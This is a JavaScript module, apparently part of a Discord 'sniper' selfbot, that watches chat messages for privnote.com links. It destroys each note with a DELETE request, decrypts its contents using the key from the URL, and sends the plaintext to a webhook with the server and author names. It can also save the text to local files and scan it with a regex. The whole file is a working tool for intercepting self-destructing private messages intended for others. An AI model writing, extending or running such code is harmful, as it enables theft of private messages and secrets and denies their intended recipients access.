const axios = require("axios").default;
const CryptoJS = require("crypto-js");
const fs = require("fs");
const logging = require("../../logging/logging");

const privid = new RegExp(/[^#]*/);
const privpass = new RegExp(/[^#]*$/);

function getData(msg, writeNotes, url, send_webhook_notes, user_tag) {
  let id = url.match(privid).splice(0, 1).toString();
  const pass = url.match(privpass).splice(0, 1).toString();
  if (!id || !pass || id === pass)
    return logging.success(
      `{rgb(137,96,142) Sniped privnote ]${id}#${pass}] - Invalid URL - ${
        msg.guild ? msg.guild.name : "DM"
      } from ${msg.author.tag}.}`,
    );

  return axios({
    url: `https://privnote.com/${id}`,
    method: "DELETE",
    headers: {
      "Content-type": "application/x-www-form-urlencoded",
      "Content-Length": "0",
      DNT: "1",
      "X-Requested-With": "XMLHttpRequest",
      Origin: "https://privnote.com",
      Referer: "https://privnote.com/hidden",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-origin",
      "User-Agent": global.userAgent,
    },
  })
    .then((res) => {
      if (!Object.prototype.hasOwnProperty.call(res.data, "data"))
        return logging.success(
          `{rgb(137,96,142) Sniped privnote [${id}#${pass}] - Non-existant/Already destroyed - ${
            msg.guild ? msg.guild.name : "DM"
          } from ${msg.author.tag}.}`,
        );

      // Decrypt gibberish-aes
      let data = CryptoJS.AES.decrypt(res.data.data, pass);
      data = data.toString(CryptoJS.enc.Utf8);
      if (!data || data.length === 0)
        return logging.success(
          `{rgb(137,96,142) Sniped privnote [${id}#${pass}] - Non-existant/Already destroyed - ${
            msg.guild ? msg.guild.name : "DM"
          } from ${msg.author.tag}.}`,
        );
      send_webhook_notes.send_webhook_notes(
        "privnote.com",
        msg.guild ? msg.guild.name : "DMs",
        msg.author.tag,
        user_tag,
        data,
        msg.url,
      );
      if (writeNotes === "true") {
        id = id.replace(/[^/\w\s]/gi, ""); // Make id filename-safe
        fs.writeFile(`./notes/privnote-${id}.txt`, data, (err) => {
          if (err) {
            logging.success(
              `{rgb(137,96,142) Sniped privnote [${id}#${pass}] - Couldn't save it to file because of err: ${
                err.message
              } - ${msg.guild ? msg.guild.name : "DM"} from ${msg.author.tag}.}`,
            );
          } else {
            logging.success(
              `{rgb(137,96,142) Sniped privnote [${id}#${pass}] - Saved to file ./notes/privnote-${id}.txt - ${
                msg.guild ? msg.guild.name : "DM"
              } from ${msg.author.tag}.}`,
            );
          }
        });
      } else {
        logging.success(
          `{rgb(137,96,142) Sniped privnote [${id}#${pass}] - ${
            msg.guild ? msg.guild.name : "DM"
          } from ${msg.author.tag}.}`,
        );
      }
      return data.match(global.regex) || [];
    })
    .catch((err) =>
      logging.success(
        `{rgb(137,96,142) Sniped privnote [${id}#${pass}] - Error: ${err} - ${
          msg.guild ? msg.guild.name : "DM"
        } from ${msg.author.tag}.}`,
      ),
    );
}

module.exports = { getData };
